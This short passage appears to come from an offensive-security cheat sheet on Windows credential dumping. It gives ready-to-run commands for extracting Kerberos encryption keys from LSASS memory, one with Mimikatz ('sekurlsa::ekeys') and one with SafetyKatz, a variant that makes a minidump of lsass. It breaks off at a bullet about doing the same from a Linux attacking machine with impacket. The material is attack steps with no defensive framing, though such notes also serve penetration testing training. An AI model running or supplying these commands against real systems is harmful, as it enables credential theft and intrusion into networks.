

* Dump credentials on a using Mimikatz.
```
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

* Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```

* From a Linux attacking machine using impacket.
